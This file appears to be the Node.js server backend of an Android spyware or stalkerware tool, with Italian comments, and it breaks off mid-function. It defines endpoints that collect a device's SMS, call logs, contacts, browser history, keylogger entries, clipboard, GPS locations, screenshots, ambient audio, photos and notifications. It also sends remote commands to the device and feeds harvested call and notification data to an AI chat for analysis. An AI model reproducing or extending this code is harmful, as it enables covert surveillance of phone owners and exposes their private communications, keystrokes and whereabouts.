'use strict';
const express = require('express');
const sharp = require('sharp');
const multer = require('multer');
const { WebSocketServer } = require('ws');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const http = require('http');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const NEXUS_ROOT = process.env.NEXUS_ROOT || '/opt/data/nexus-local';
const DATA_DIR = process.env.NEXUS_DATA_DIR || path.join(NEXUS_ROOT, 'data');
const DASHBOARD_DIR = process.env.NEXUS_DASHBOARD_DIR || path.join(__dirname, 'dashboard');
const TOKEN = process.env.NEXUS_TOKEN || 'change-me';
const ONLINE_WINDOW_MS = 5 * 60 * 1000;
const MAX_RECORDS = 10000;

// ── Middleware ──────────────────────────────────────────────
app.use(cors({ origin: false }));
app.use((req, res, next) => {
  if (!req.path.includes("/dashboard") && !req.path.includes("/thumb")) {
    console.log(req.method + " " + req.path + " from " + (req.headers["x-forwarded-for"] || req.socket.remoteAddress));
  }
  next();
});
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/dashboard', express.static(DASHBOARD_DIR));

// ── Auth ────────────────────────────────────────────────────
function checkAuth(req, res, next) {
  const t = req.headers['x-token'] || req.query.token;
  const a = Buffer.from(String(t || ''));
  const b = Buffer.from(String(TOKEN || ''));
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
}

// ── Helpers ─────────────────────────────────────────────────
function readJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return def; }
}
function writeJSON(file, data) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const tmp = `${file}.${process.pid}.${Date.now()}.tmp`;
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
  fs.renameSync(tmp, file);
}
function safeDeviceId(value) {
  const id = String(value || '');
  if (!/^[A-Za-z0-9._-]{1,128}$/.test(id)) throw new Error('invalid deviceId');
  return id;
}
function safeFilename(value) {
  const name = path.basename(String(value || '')).replace(/[^A-Za-z0-9._ -]/g, '_');
  if (!name || name === '.' || name === '..') throw new Error('invalid filename');
  return name.slice(0, 240);
}
function bounded(items, max = MAX_RECORDS) {
  return items.length > max ? items.slice(items.length - max) : items;
}
function deviceFile(sub, id, ext = 'json') {
  return path.join(DATA_DIR, sub, `${safeDeviceId(id)}.${ext}`);
}

// ── WebSocket broadcast ─────────────────────────────────────
const wsClients = new Set();
const deviceSockets = new Map(); // deviceId -> ws per push diretto comandi
wss.on('connection', (ws, req) => {
  const requestUrl = new URL(req.url, 'http://localhost');
  if (requestUrl.searchParams.get('token') !== TOKEN) return ws.close(1008, 'unauthorized');
  wsClients.add(ws);
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });
  // close handled below
  ws.on('message', (msg) => {
    try {
      const d = JSON.parse(msg);
      // FIX 2 — deviceSockets mai popolata
      if (d.type === 'register' && d.deviceId) {
        ws.deviceId = d.deviceId;
        deviceSockets.set(d.deviceId, ws);
        ws.send(JSON.stringify({ type: 'registered', deviceId: d.deviceId }));
        return;
      }
      if (d.type === 'ping') ws.send(JSON.stringify({ type: 'pong' }));
    } catch {}
  });
  // FIX 1 — ws.on('close') mancante (memory leak)
  ws.on('close', () => {
    wsClients.delete(ws);
    if (ws.deviceId) deviceSockets.delete(ws.deviceId);
  });
  ws.send(JSON.stringify({ type: 'connected' }));
});
setInterval(() => {
  wsClients.forEach(ws => {
    if (!ws.isAlive) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 25000);
function broadcast(event, data) {
  const msg = JSON.stringify({ event, data, ts: Date.now() });
  wsClients.forEach(ws => { try { if (ws.readyState === 1) ws.send(msg); } catch {} });
}

// ── Upload media ────────────────────────────────────────────
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'media', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${uuidv4()}_${safeFilename(file.originalname)}`)
});
const MAX_MEDIA_UPLOAD_BYTES = 1024 * 1024 * 1024;
const upload = multer({ storage, limits: { fileSize: MAX_MEDIA_UPLOAD_BYTES } });

const audioStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'audio', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${safeFilename(file.originalname)}`)
});
const uploadAudio = multer({ storage: audioStorage, limits: { fileSize: 100 * 1024 * 1024 } });

const screenshotStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'screenshots', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${safeFilename(file.originalname)}`)
});
const uploadScreenshot = multer({ storage: screenshotStorage, limits: { fileSize: 50 * 1024 * 1024 } });

const backupStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId));
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `${Date.now()}_${uuidv4()}_${safeFilename(file.originalname)}`)
});
const uploadBackup = multer({ storage: backupStorage, limits: { fileSize: 1024 * 1024 * 1024 } });

// ═══════════════════════════════════════════════════════════
// API ROUTES
// ═══════════════════════════════════════════════════════════

// ── Ping / heartbeat ────────────────────────────────────────
// Token is never exposed by an endpoint; dashboard receives it out-of-band.
app.get('/api/token', (req, res) => res.status(404).json({ error: 'not found' }));
app.post('/api/ping', checkAuth, (req, res) => {
  const { deviceId, deviceName, model, androidVersion, battery, network, ip, reliabilityProtocol, status } = req.body;
  if (!deviceId) return res.json({ ok: false });
  const devFile = path.join(DATA_DIR, 'devices.json');
  const devices = readJSON(devFile, {});
  devices[deviceId] = {
    ...devices[deviceId],
    deviceId, deviceName, model, androidVersion,
    battery, network, ip, reliabilityProtocol: reliabilityProtocol || 1,
    status: status && typeof status === 'object' ? status : devices[deviceId]?.status,
    lastSeen: Date.now(),
    online: true
  };
  writeJSON(devFile, devices);
  broadcast('device_ping', { deviceId, battery, network, lastSeen: Date.now() });

  // Rispondi con comandi pending
  const cmdFile = deviceFile('commands', deviceId);
  const cmds = readJSON(cmdFile, []);
  // Protocol v2 keeps commands until explicit app ACK. Legacy clients retain
  // consume-on-delivery semantics to avoid repeated execution.
  if (cmds.length > 0 && Number(reliabilityProtocol || 1) < 2) writeJSON(cmdFile, []);
  res.json({ ok: true, commands: cmds });
});

// ── Devices ─────────────────────────────────────────────────
app.get('/api/devices', checkAuth, (req, res) => {
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  const now = Date.now();
  Object.values(devices).forEach(d => {
    // FIX 4 — soglia online 60s → 300s (5 minuti)
    d.online = (now - (d.lastSeen || 0)) < ONLINE_WINDOW_MS;
  });
  res.json(Object.values(devices));
});

// ── Events / notifiche ──────────────────────────────────────
app.post('/api/events', checkAuth, (req, res) => {
  const { deviceId, events } = req.body;
  if (!deviceId || !Array.isArray(events)) return res.json({ ok: false });
  const file = deviceFile('events', deviceId);
  const existing = readJSON(file, []);
  const sanitize = s => typeof s === 'string' ? s.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, ' ') : s;
  const incoming = events.map(e => ({
    ...e,
    title: sanitize(e.title),
    conversation: sanitize(e.conversation),
    sender: sanitize(e.sender),
    body: sanitize(e.body),
    ts: e.ts || Date.now()
  }));
  const known = new Set(existing.map(e => e.eventId).filter(Boolean));
  const newEvents = incoming.filter(e => !e.eventId || !known.has(e.eventId));
  const merged = [...existing, ...newEvents];
  writeJSON(file, bounded(merged));
  newEvents.forEach(e => broadcast('event', { deviceId, ...e }));
  res.json({ ok: true });
});

app.get('/api/events', checkAuth, (req, res) => {
  const { deviceId, app: appFilter, limit = 200 } = req.query;
  if (!deviceId) {
    // Tutti i device
    const dir = path.join(DATA_DIR, 'events');
    let all = [];
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach(f => {
        const did = f.replace('.json', '');
        const evs = readJSON(path.join(dir, f), []);
        evs.forEach(e => all.push({ ...e, deviceId: did }));
      });
    }
    // FIX 5 — timestamp eventi: ts vs timestamp
    all.sort((a, b) => (b.ts || b.timestamp || 0) - (a.ts || a.timestamp || 0));
    return res.json(all.slice(0, parseInt(limit)));
  }
  const file = deviceFile('events', deviceId);
  let evs = readJSON(file, []);
  if (appFilter) evs = evs.filter(e => e.app === appFilter);
  // FIX 5 — timestamp eventi: ts vs timestamp
  evs.sort((a, b) => (b.ts || b.timestamp || 0) - (a.ts || a.timestamp || 0));
  res.json(evs.slice(0, parseInt(limit)));
});

// ── Location ─────────────────────────────────────────────────
app.post('/api/location', checkAuth, (req, res) => {
  const { deviceId, lat, lng, accuracy, altitude, speed, ts } = req.body;
  if (!deviceId || !Number.isFinite(Number(lat)) || !Number.isFinite(Number(lng))) {
    return res.status(400).json({ ok: false });
  }
  const file = deviceFile('locations', deviceId);
  const locs = readJSON(file, []);
  const entry = { lat, lng, accuracy, altitude, speed, ts: ts || Date.now() };
  locs.push(entry);
  writeJSON(file, bounded(locs));
  broadcast('location', { deviceId, ...entry });
  res.json({ ok: true });
});

app.get('/api/location/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('locations', req.params.deviceId);
  const locs = readJSON(file, []);
  res.json(locs);
});
app.get('/api/locations/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('locations', req.params.deviceId), []));
});

// ── Comandi ──────────────────────────────────────────────────
app.get('/api/commands/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('commands', req.params.deviceId);
  const cmds = readJSON(file, []);
  // Read-only inspection; delivery happens in heartbeat and removal only via ACK.
  res.json(cmds);
});

app.post('/api/commands/:deviceId/:commandId/ack', checkAuth, (req, res) => {
  const file = deviceFile('commands', req.params.deviceId);
  const cmds = readJSON(file, []);
  const found = cmds.find(c => c.id === req.params.commandId);
  if (!found) return res.json({ ok: true, alreadyAcked: true });
  writeJSON(file, cmds.filter(c => c.id !== req.params.commandId));
  const ackFile = deviceFile('command-acks', req.params.deviceId);
  const acks = readJSON(ackFile, []);
  acks.push({ ...found, success: req.body.success === true,
    detail: req.body.detail || '', ackedAt: Date.now() });
  writeJSON(ackFile, acks.slice(-1000));
  res.json({ ok: true });
});

app.post('/api/commands/:deviceId', checkAuth, (req, res) => {
  const { type, params } = req.body;
  const allowed = new Set(['sync_media', 'get_location', 'get_apps', 'get_status']);
  if (!type || !allowed.has(type)) {
    return res.status(400).json({ ok: false, error: 'unsupported command' });
  }
  const file = deviceFile('commands', req.params.deviceId);
  const cmds = readJSON(file, []);
  const cmd = { id: uuidv4(), type, params: params || {}, ts: Date.now() };
  cmds.push(cmd);
  writeJSON(file, cmds);
  broadcast('command_sent', { deviceId: req.params.deviceId, ...cmd });
  // Push diretto al device se connesso via WebSocket
  const devWs = deviceSockets.get(req.params.deviceId);
  if (devWs && devWs.readyState === 1) {
    devWs.send(JSON.stringify({ type: 'command', command: cmd }));
    console.log('WS push comando a ' + req.params.deviceId + ': ' + type);
  }
  res.json({ ok: true, command: cmd });
});

// ── Media (foto/video) ───────────────────────────────────────
app.post('/api/media/:deviceId', checkAuth, upload.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  if (!req.file) return res.status(400).json({ ok: false, error: 'no file' });
  const { originalname, filename, size, mimetype } = req.file;
  const safeOriginalName = safeFilename(originalname);

  // Dedup check before committing the temp upload to the public media name.
  const metaFile = path.join(DATA_DIR, 'media', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  const exists = meta.find(m => (m.originalName || m.name) === safeOriginalName && m.size === size);
  if (exists) {
    try { fs.unlinkSync(req.file.path); } catch {}
    return res.json({ ok: true, dedup: true, filename: exists.name });
  }

  const mediaDir = path.join(DATA_DIR, 'media', deviceId);
  let finalName = safeOriginalName;
  let finalPath = path.join(mediaDir, finalName);
  if (fs.existsSync(finalPath)) {
    finalName = `${Date.now()}_${safeOriginalName}`;
    finalPath = path.join(mediaDir, finalName);
  }
  fs.renameSync(req.file.path, finalPath);

  const entry = { name: finalName, originalName: safeOriginalName, size, mime: mimetype, ts: Date.now() };
  meta.push(entry);
  writeJSON(metaFile, meta);
  broadcast('media_new', { deviceId, ...entry });
  res.json({ ok: true, filename: finalName });
});

app.get('/api/media/:deviceId', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const { type, page = 1, limit = 9999 } = req.query;
  const metaFile = path.join(DATA_DIR, 'media', deviceId, 'meta.json');
  let meta = readJSON(metaFile, []);
  if (type === 'photo') meta = meta.filter(m => m.mime && m.mime.startsWith('image/'));
  if (type === 'video') meta = meta.filter(m => m.mime && m.mime.startsWith('video/'));
  // FIX 6 — ordinamento media: ts vs serverTime
  meta.sort((a, b) => (b.ts || b.serverTime || 0) - (a.ts || a.serverTime || 0));
  const total = meta.length;
  const start = (parseInt(page) - 1) * parseInt(limit);
  const items = meta.slice(start, start + parseInt(limit));
  res.json({ total, items });
});

app.get('/api/media/:deviceId/:filename', checkAuth, (req, res) => {
  const base = path.join(DATA_DIR, 'media', safeDeviceId(req.params.deviceId)); const safeName = safeFilename(req.params.filename); let file = path.join(base, safeName); if (!fs.existsSync(file)) file = path.join(base, 'photos', safeName); if (!fs.existsSync(file)) file = path.join(base, 'videos', safeName);
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});


// ── Thumbnail cache ───────────────────────────────────────────
app.get('/api/thumb/:deviceId/:filename', checkAuth, async (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const filename = safeFilename(req.params.filename);
  const base = path.join(DATA_DIR, 'media', deviceId);
  let orig = path.join(base, filename);
  if (!fs.existsSync(orig)) orig = path.join(base, 'photos', filename);
  if (!fs.existsSync(orig)) orig = path.join(base, 'videos', filename);
  if (!fs.existsSync(orig)) return res.status(404).json({ error: 'not found' });

  const thumbDir = path.join(DATA_DIR, 'thumbs', deviceId);
  const thumbPath = path.join(thumbDir, filename + '.thumb.jpg');

  // Serve dalla cache se esiste
  if (fs.existsSync(thumbPath)) {
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    return res.sendFile(thumbPath);
  }

  // FIX 7 — thumb video non crasha
  if (/\.(mp4|mov|avi|mkv|3gp)$/i.test(filename)) {
    return res.status(415).json({ error: 'video thumbnail not supported' });
  }

  try {
    fs.mkdirSync(thumbDir, { recursive: true });
    await sharp(orig)
      .resize(300, 300, { fit: 'cover', position: 'centre' })
      .jpeg({ quality: 70, progressive: true })
      .toFile(thumbPath);
    res.setHeader('Content-Type', 'image/jpeg');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    res.sendFile(thumbPath);
  } catch (e) {
    // Fallback: servi originale
    res.sendFile(orig);
  }
});

// ── Audio ambientale ─────────────────────────────────────────
app.post('/api/audio/:deviceId', checkAuth, uploadAudio.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  if (!req.file) return res.status(400).json({ ok: false });
  const entry = { name: req.file.filename, size: req.file.size, ts: Date.now() };
  const metaFile = path.join(DATA_DIR, 'audio', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  meta.unshift(entry);
  writeJSON(metaFile, meta);
  broadcast('audio_new', { deviceId, ...entry });
  res.json({ ok: true });
});

app.get('/api/audio/:deviceId', checkAuth, (req, res) => {
  const metaFile = path.join(DATA_DIR, 'audio', safeDeviceId(req.params.deviceId), 'meta.json');
  res.json(readJSON(metaFile, []));
});

app.get('/api/audio/:deviceId/:filename', checkAuth, (req, res) => {
  const file = path.join(DATA_DIR, 'audio', safeDeviceId(req.params.deviceId), safeFilename(req.params.filename));
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});

// ── Screenshot ───────────────────────────────────────────────
app.post('/api/screenshot/:deviceId', checkAuth, uploadScreenshot.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  if (!req.file) return res.status(400).json({ ok: false });
  const entry = { name: req.file.filename, size: req.file.size, ts: Date.now() };
  const metaFile = path.join(DATA_DIR, 'screenshots', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  meta.unshift(entry);
  writeJSON(metaFile, meta);
  broadcast('screenshot_new', { deviceId, ...entry });
  res.json({ ok: true });
});

app.get('/api/screenshot/:deviceId', checkAuth, (req, res) => {
  const metaFile = path.join(DATA_DIR, 'screenshots', safeDeviceId(req.params.deviceId), 'meta.json');
  res.json(readJSON(metaFile, []));
});

app.get('/api/screenshot/:deviceId/:filename', checkAuth, (req, res) => {
  const file = path.join(DATA_DIR, 'screenshots', safeDeviceId(req.params.deviceId), safeFilename(req.params.filename));
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});

// ── Backup/cartella extra: separato dalla galleria MediaStore ───────────────
app.post('/api/backups/:deviceId', checkAuth, uploadBackup.single('file'), (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  if (!req.file) return res.status(400).json({ ok: false, error: 'no file' });
  const metaFile = path.join(DATA_DIR, 'backups', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  const originalName = safeFilename(req.file.originalname);
  const exists = meta.find(m => m.originalName === originalName && m.size === req.file.size);
  if (exists) {
    try { fs.unlinkSync(req.file.path); } catch {}
    return res.json({ ok: true, dedup: true, filename: exists.name });
  }
  const entry = {
    name: req.file.filename,
    originalName,
    size: req.file.size,
    mime: req.file.mimetype,
    ts: Date.now(),
    source: 'extra_folder'
  };
  meta.unshift(entry);
  writeJSON(metaFile, bounded(meta));
  broadcast('backup_new', { deviceId, ...entry });
  res.json({ ok: true, filename: entry.name });
});

app.get('/api/backups/:deviceId', checkAuth, (req, res) => {
  const metaFile = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId), 'meta.json');
  res.json(readJSON(metaFile, []));
});

app.get('/api/backups/:deviceId/:filename', checkAuth, (req, res) => {
  const file = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId), safeFilename(req.params.filename));
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});

// ── SMS ───────────────────────────────────────────────────────
app.post('/api/sms/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { messages } = req.body;
  if (!Array.isArray(messages)) return res.json({ ok: false });
  const file = deviceFile('sms', deviceId);
  const existing = readJSON(file, []);
  const smsKey = m => (m.id || m._id) ? `id:${m.id || m._id}` : `fallback:${m.address || m.number || m.phoneNumber || m.from || ''}:${m.date || m.timestamp || m.ts || ''}:${m.body || m.text || m.message || ''}`;
  const ids = new Set(existing.map(smsKey));
  const newMsgs = messages.filter(m => {
    const key = smsKey(m);
    if (ids.has(key)) return false;
    ids.add(key);
    return true;
  });
  writeJSON(file, bounded([...existing, ...newMsgs]));
  if (newMsgs.length) broadcast('sms_new', { deviceId, count: newMsgs.length });
  res.json({ ok: true, added: newMsgs.length });
});

app.get('/api/sms/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('sms', req.params.deviceId);
  const msgs = readJSON(file, []);
  msgs.sort((a, b) => (b.date || b.ts || 0) - (a.date || a.ts || 0));
  res.json(msgs);
});

// ── Call log ──────────────────────────────────────────────────
app.post('/api/calllog/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { calls } = req.body;
  if (!Array.isArray(calls)) return res.json({ ok: false });
  const file = deviceFile('calllog', deviceId);
  const existing = readJSON(file, []);
  const ids = new Set(existing.map(c => `${c.number}_${c.date}`));
  const newCalls = calls.filter(c => !ids.has(`${c.number}_${c.date}`));
  writeJSON(file, bounded([...existing, ...newCalls]));
  if (newCalls.length) broadcast('calllog_new', { deviceId, count: newCalls.length });
  res.json({ ok: true, added: newCalls.length });
});

app.get('/api/calllog/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('calllog', req.params.deviceId);
  const calls = readJSON(file, []);
  calls.sort((a, b) => (b.date || 0) - (a.date || 0));
  res.json(calls);
});

// ── Contatti ──────────────────────────────────────────────────
app.post('/api/contacts/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { contacts } = req.body;
  if (!Array.isArray(contacts)) return res.json({ ok: false });
  writeJSON(deviceFile('contacts', deviceId), contacts);
  res.json({ ok: true, total: contacts.length });
});

app.get('/api/contacts/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('contacts', req.params.deviceId), []));
});

// ── Browser history ───────────────────────────────────────────
app.post('/api/browser/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { history } = req.body;
  if (!Array.isArray(history)) return res.json({ ok: false });
  const file = deviceFile('browser', deviceId);
  const existing = readJSON(file, []);
  const urls = new Set(existing.map(h => `${h.url}_${h.ts}`));
  const newItems = history.filter(h => !urls.has(`${h.url}_${h.ts}`));
  writeJSON(file, bounded([...existing, ...newItems]));
  res.json({ ok: true, added: newItems.length });
});

app.get('/api/browser/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('browser', req.params.deviceId);
  const history = readJSON(file, []);
  history.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  res.json(history);
});

// ── Keylogger ─────────────────────────────────────────────────
app.post('/api/keylog/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { entries } = req.body;
  if (!Array.isArray(entries)) return res.json({ ok: false });
  const file = deviceFile('keylog', deviceId);
  const existing = readJSON(file, []);
  const sanitize = s => typeof s === 'string' ? s.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, ' ') : s;
  const newEntries = entries.map(e => ({ ...e, text: sanitize(e.text), ts: e.ts || Date.now() }));
  writeJSON(file, bounded([...existing, ...newEntries]));
  res.json({ ok: true, added: newEntries.length });
});

app.get('/api/keylog/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('keylog', req.params.deviceId);
  const entries = readJSON(file, []);
  entries.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  res.json(entries);
});

// ── Clipboard ─────────────────────────────────────────────────
app.post('/api/clipboard/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { text, ts } = req.body;
  if (!text) return res.json({ ok: false });
  const file = deviceFile('clipboard', deviceId);
  const existing = readJSON(file, []);
  existing.unshift({ text, ts: ts || Date.now() });
  writeJSON(file, existing.slice(0, MAX_RECORDS));
  broadcast('clipboard_new', { deviceId, text: text.substring(0, 50) });
  res.json({ ok: true });
});

app.get('/api/clipboard/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('clipboard', req.params.deviceId), []));
});

// ── App installate ────────────────────────────────────────────
app.post('/api/apps/:deviceId', checkAuth, (req, res) => {
  const { apps } = req.body;
  if (!Array.isArray(apps)) return res.json({ ok: false });
  writeJSON(deviceFile('apps', req.params.deviceId), apps);
  res.json({ ok: true, total: apps.length });
});

app.get('/api/apps/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('apps', req.params.deviceId), []));
});

// ── Diagnostica dispositivo (nessun contenuto personale) ─────
app.post('/api/status/:deviceId', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const status = req.body && req.body.status;
  if (!status || typeof status !== 'object' || Array.isArray(status)) {
    return res.status(400).json({ ok: false, error: 'invalid status' });
  }
  const clean = { ...status, receivedAt: Date.now() };
  writeJSON(deviceFile('status', deviceId), clean);
  const devicesFile = path.join(DATA_DIR, 'devices.json');
  const devices = readJSON(devicesFile, {});
  if (devices[deviceId]) {
    devices[deviceId].status = clean;
    writeJSON(devicesFile, devices);
  }
  broadcast('device_status', { deviceId, status: clean });
  res.json({ ok: true });
});

app.get('/api/status/:deviceId', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const saved = readJSON(deviceFile('status', deviceId), null);
  if (saved) return res.json(saved);
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  res.json(devices[deviceId]?.status || {});
});

// ── Stats ─────────────────────────────────────────────────────
app.get('/api/stats', checkAuth, (req, res) => {
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  const now = Date.now();
  const stats = { devices: {}, totals: { devices: 0, media: 0, events: 0, calls: 0, sms: 0, contacts: 0, apps: 0 } };
  Object.entries(devices).forEach(([id, d]) => {
    const media = readJSON(path.join(DATA_DIR, 'media', id, 'meta.json'), []);
    const events = readJSON(deviceFile('events', id), []);
    const calls = readJSON(deviceFile('calllog', id), []);
    const sms = readJSON(deviceFile('sms', id), []);
    const contacts = readJSON(deviceFile('contacts', id), []);
    const apps = readJSON(deviceFile('apps', id), []);
    const screenshots = readJSON(path.join(DATA_DIR, 'screenshots', id, 'meta.json'), []);
    const audio = readJSON(path.join(DATA_DIR, 'audio', id, 'meta.json'), []);
    stats.devices[id] = {
      name: d.deviceName || id,
      online: (now - (d.lastSeen || 0)) < ONLINE_WINDOW_MS,
      battery: d.battery,
      network: d.network,
      media: media.length,
      events: events.length,
      calls: calls.length,
      sms: sms.length,
      contacts: contacts.length,
      apps: apps.length,
      screenshots: screenshots.length,
      audio: audio.length,
      lastSeen: d.lastSeen
    };
    stats.totals.media += media.length;
    stats.totals.events += events.length;
    stats.totals.calls += calls.length;
    stats.totals.sms += sms.length;
    stats.totals.contacts += contacts.length;
    stats.totals.apps += apps.length;
    stats.totals.devices++;
  });
  res.json(stats);
});

// ── ZIP media ─────────────────────────────────────────────────
const zipJobs = {};
app.post('/api/media/:deviceId/zip/prepare', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const jobId = uuidv4();
  zipJobs[jobId] = { status: 'running', deviceId };
  const dir = path.join(DATA_DIR, 'media', deviceId);
  const zipPath = path.join(DATA_DIR, 'zips', `media_${deviceId}_${jobId}.zip`);
  fs.mkdirSync(path.join(DATA_DIR, 'zips'), { recursive: true });
  const { spawn } = require('child_process');
  const proc = spawn('zip', ['-r', zipPath, '.'], { cwd: dir });
  proc.on('close', code => {
    if (code === 0) {
      const stat = fs.statSync(zipPath);
      zipJobs[jobId] = { status: 'done', zipPath, size: stat.size };
    } else {
      zipJobs[jobId] = { status: 'error' };
    }
    setTimeout(() => delete zipJobs[jobId], 3600000);
  });
  res.json({ ok: true, jobId });
});

app.get('/api/media/:deviceId/zip/status', checkAuth, (req, res) => {
  const job = zipJobs[req.query.jobId];
  if (!job) return res.json({ status: 'not_found' });
  res.json(job);
});

app.get('/api/media/:deviceId/zip/download', checkAuth, (req, res) => {
  const job = zipJobs[req.query.jobId];
  if (!job || job.status !== 'done') return res.status(404).json({ error: 'not ready' });
  res.download(job.zipPath);
});

// ── AI Chat ───────────────────────────────────────────────────
app.post('/api/ai/chat', checkAuth, async (req, res) => {
  const { message, deviceId } = req.body;
  if (!message) return res.status(400).json({ error: 'message required' });

  // Raccoglie dati interni come contesto
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  const targetDevice = deviceId || Object.keys(devices)[0];
  
  let context = `Sei un assistente AI che analizza dati di monitoraggio dispositivi Android. Rispondi SOLO su dati interni del sistema. Non rispondere a domande esterne.\n\n`;
  
  if (targetDevice) {
    const calls = readJSON(deviceFile('calllog', targetDevice), []);
    const sms = readJSON(deviceFile('sms', targetDevice), []);
    const events = readJSON(deviceFile('events', targetDevice), []);
    const media = readJSON(path.join(DATA_DIR, 'media', targetDevice, 'meta.json'), []);
    const locs = readJSON(deviceFile('locations', targetDevice), []);
    const contacts = readJSON(deviceFile('contacts', targetDevice), []);
    
    context += `Device: ${devices[targetDevice]?.deviceName || targetDevice}\n`;
    context += `Totale chiamate: ${calls.length}\n`;
    context += `Totale SMS: ${sms.length}\n`;
    context += `Totale notifiche: ${events.length}\n`;
    context += `Totale media: ${media.length}\n`;
    context += `Totale posizioni: ${locs.length}\n`;
    context += `Totale contatti: ${contacts.length}\n`;
    
    // Ultime 10 chiamate
    const lastCalls = calls.slice(0, 10).map(c => 
      `${new Date(c.date).toLocaleString('it-IT')} - ${c.name || c.number} (${c.duration}s)`
    ).join('\n');
    context += `\nUltime chiamate:\n${lastCalls}\n`;

    // Top 5 contatti per chiamate
    const callStats = {};
    calls.forEach(c => {
      const k = c.name || c.number;
      callStats[k] = (callStats[k] || 0) + 1;
    });
    const top5 = Object.entries(callStats).sort((a,b) => b[1]-a[1]).slice(0,5);
    context += `\nTop contatti: ${top5.map(([n,c]) => `${n}(${c})`).join(', ')}\n`;

    // Ultime notifiche
    const lastEvents = events.slice(0, 10).map(e =>
      `${e.app}: ${(e.title||'').substring(0,30)} - ${(e.body||'').substring(0,50)}`
    ).join('\n');
    context += `\nUltime notifiche:\n${lastEvents}\n`;
  }

  try {
    // Usa Gemini API (gratuita)
    const GEMINI_KEY = process.env.GEMINI_API_KEY || '';
    if (!GEMINI_KEY) {
      return res.json({ reply: `[AI non configurata — aggiungi GEMINI_API_KEY]\n\nContesto disponibile:\n${context.substring(0, 500)}` });
    }
    const resp = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contents: [{
            parts: [{ text: `${context}\n\nDomanda utente: ${message}` }]
          }],
          generationConfig: { maxOutputTokens: 1024, temperature: 0.3 }
        })
      }
    );
    const data = await resp.json();
